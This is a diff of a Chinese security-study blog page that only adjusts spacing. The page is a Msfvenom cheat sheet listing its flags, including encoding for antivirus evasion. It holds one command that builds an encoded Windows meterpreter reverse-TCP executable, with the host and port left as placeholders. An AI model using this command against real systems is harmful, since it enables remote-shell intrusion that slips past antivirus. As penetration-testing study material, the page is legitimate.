@@ -242,24 +242,24 @@
     
     
     <div class="post-body" itemprop="articleBody"><h2 id="Msfvenom">Msfvenom</h2>
-<h3 id="常用参数">常用参数</h3>
-<p>-p  指定payload<br>
--f  指定输出格式<br>
--e  指定使用的encoder编码免杀<br>
--a  指定payload的目标架构<br>
--o  保存payload文件输出<br>
--b  设定规避字符集<br>
--n  为payload预先指定一个NOP滑动长度<br>
+<h3 id="常用参数"> 常用参数 </h3>
+<p>-p  指定 payload<br>
+-f  指定输出格式 <br>
+-e  指定使用的 encoder 编码免杀 <br>
+-a  指定 payload 的目标架构 <br>
+-o  保存 payload 文件输出 <br>
+-b  设定规避字符集 <br>
+-n  为 payload 预先指定一个 NOP 滑动长度 <br>
 -s  设定有效攻击载荷的最大长度（文件大小）<br>
--i  指定payload的编码次数<br>
--c  指定一个附加的win32 shellcode文件<br>
--x  指定一个自定义的可执行文件作为模板<br>
--k  保护模板程序的动作，payload作为新的进程运行<br>
--v  指定一个自定义的变量，以确定输出格式</p>
+-i  指定 payload 的编码次数 <br>
+-c  指定一个附加的 win32 shellcode 文件 <br>
+-x  指定一个自定义的可执行文件作为模板 <br>
+-k  保护模板程序的动作，payload 作为新的进程运行 <br>
+-v  指定一个自定义的变量，以确定输出格式 </p>
 <span id="more"></span>
-<p>生成一个Windows平台的payload:</p>
+<p> 生成一个 Windows 平台的 payload:</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -a x86 —platform Windows -p windows/meterpreter/reverse_tcp LHOST=xxx LPORT=xxx -e x86/shikata_ga_nai -b ‘\x00\x0a\xff’ -i 3 -f exe -o payload.exe</span><br></pre></td></tr></table></figure>
-<h2 id="漏洞利用流程">漏洞利用流程</h2>
+<h2 id="漏洞利用流程"> 漏洞利用流程 </h2>
 
     </div>
 
@@ -278,8 +278,8 @@
 
           <div class="post-nav">
             <div class="post-nav-item">
-                <a href="/2025/08/msb-12-logic/" rel="prev" title="12-逻辑漏洞">
-                  <i class="fa fa-angle-left"></i> 12-逻辑漏洞
+                <a href="/2025/08/msb-12-logic/" rel="prev" title="12- 逻辑漏洞">
+                  <i class="fa fa-angle-left"></i> 12- 逻辑漏洞
                 </a>
             </div>
             <div class="post-nav-item">
